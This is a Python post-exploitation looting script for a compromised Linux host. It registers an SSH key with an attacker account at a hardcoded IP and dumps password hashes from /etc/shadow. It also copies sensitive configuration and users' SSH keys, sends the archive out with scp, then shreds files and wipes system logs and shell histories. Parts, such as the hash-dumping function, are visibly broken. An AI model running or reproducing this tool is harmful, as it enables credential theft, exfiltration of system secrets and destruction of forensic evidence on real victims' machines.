#!/usr/bin/python
import os, sys, operator, pexpect, subprocess

looter = "looter"# the username of attacker SSH account
host = "18.232.30.135"# IP address of attacker
port = "666"# SSH login IP address
target = "127.0.0.1"# Owned host

def subprocess_popen(cmd):
    p = subprocess.Popen(
        cmd,
        shell=True,
        executable='/bin/bash',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    o = p.stdout.read()
    output = str(o.encode('utf-8')).strip().rstrip()
    return output

def bash_cmd(cmd):
    subprocess.call(cmd,shell=True,executable='/bin/bash')
    return

def pexpect_ssh_keygen():
    # pexpect ssh-keygen (if victim never had a ssh keygen before)

    cmd = "ssh-keygen"
    child = pexpect.spawn(
        cmd,
        logfile=sys.stdout,
        timeout=20
     )
    result=child.expect(
        [
            pexpect.EOF,
            'Enter file in which to save the key',
            'Overwrite (y/n)',
            pexpect.TIMEOUT,
            'Enter passphrase (empty for no passphrase)',
            'Enter same passphrase again:'
        ]
    )
    try:
        if(result==0):# If EOF error, send new line to keep process running
            child.sendline('\n')
        if(result==1):# If it asks for username
            # child.sendline(username)
            # # Wait 10 seconds for password prompt
            # child.expect_exact('Password',timeout=10)
            # child.sendline(password)
            child.sendline('\n')
        if(result==2):# if it asks for password
            child.sendline('n')
        if(result==3):# if timed out in 20 seconds. Release control to user
            child.interact()
        if(result==4):
            child.sendline("\n")
        if(result==5):
            child.sendline("\n")
    except:
        err = child.read()
        # print "UNKNOWN EXCEPTION:\r\n",err    
    return
def install_ssh_key(): # for communicating back with server
    pexpect_ssh_keygen()
    # ssh-copy-id to looter account on server
    bash_cmd("ssh-copy-id -p {} -f {}@{}".format(
        str(port),
        str(looter),
        str(host)
    ))
    return
file_locations = [
    '/etc/bash.bashrc',
    '/etc/bash_completion',
    '/etc/ca-certificates.conf',
    '/etc/ca-certificates.conf.dpkg-old',
    '/etc/crontab',
    '/etc/environment',
    '/etc/group',
    '/etc/gshadow',
    '/etc/hostname',
    '/etc/hosts',
    '/etc/networks',
    '/etc/passwd',
    '/etc/resolv.conf',
    '/etc/rsyslog.conf',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/apache2',
    '/etc/ca-certificates',
    '/etc/cryptsetup-initramfs',
    '/etc/init.d',
    '/etc/modprobe.d',
    '/etc/modules-load.d',
    '/etc/network',
    '/etc/networkd-dispatcher',
    '/etc/NetworkManager',
    '/etc/openvpn',
    '/etc/ssh',
    '/etc/ssl',
    '/etc/sudoers.d'
]

def loot_config(file_locations):
    bash_cmd("mkdir /tmp/configloot")
    for i in file_locations:
        bash_cmd("cp -r {} /tmp/configloot".format(str(i)))
    
    bash_cmd("zip -r /tmp/configloot.zip /tmp/configloot")
    return

def hash_dump():
    commands = "unshadow /etc/passwd /etc/shadow"
    output = subprocess.Popen(commands)

    w.open('/tmp/hashes.txt','a+')
    for line in output:
        line.split(':')
        username = line[0]
        pwhash = line[1]
        homepath = line[5]
        prefshell = line[6]

        w.write("\r\nUSERNAME:\t{}\r\nPASSWORD HASH:\t{}\r\nHOME PATH:\t{}\r\nPREFERRED SHELL ENV:\t{}".format(
            str(username),
            str(pwhash),
            str(homepath),
            str(prefshell)
        ))
    
    w.close()
    return

def loot_ssh_keys():
    bash_cmd("for i in $(ls /home); do cat -r $i/.ssh/* >> /tmp/ssh_creds; done")
    return

def main():
    install_ssh_key()

    # dump passwd and shadow hashes using John
    hash_dump()

    # loot all useful configuration files
    loot_config(file_locations)
    bash_cmd("zip -r /tmp/loot_{}.zip /tmp/*".format(str(target)))
    bash_cmd("cd /tmp && scp -r /tmp/* {}@{}://home/{}/".format(
        str(looter),
        str(host),
        str(looter)
    ))
    bash_cmd("for i in $(ls /tmp); do shred -zu $i; done")
    bash_cmd("for i in $(ls /var/log); do echo '' > $i; done")
    bash_cmd("for i in $(ls /home); do echo '' > $i/bash_history; done")
    return
main()